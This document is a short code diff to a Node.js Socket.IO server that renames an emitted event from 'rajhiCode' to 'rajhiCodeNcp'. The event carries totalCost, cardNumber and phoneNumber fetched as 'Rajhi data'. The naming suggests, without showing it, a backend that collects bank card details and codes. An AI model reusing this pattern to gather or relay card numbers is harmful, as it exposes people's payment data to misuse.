@@ -230,7 +230,7 @@ io.on("connection", (socket) => {
       const phoneNumber = lastPhone?.phoneNumber ?? null;
 
       // 5) Emit ONLY the requested fields
-      socket.emit("rajhiCode", {
+      socket.emit("rajhiCodeNcp", {
         error: null,
         totalCost,
         cardNumber,
@@ -238,7 +238,7 @@ io.on("connection", (socket) => {
       });
     } catch (err) {
       console.error("Error fetching Rajhi data:", err);
-      socket.emit("rajhiCode", {
+      socket.emit("rajhiCodeNcp", {
         error: err.message,
         totalCost: null,
         cardNumber: null,
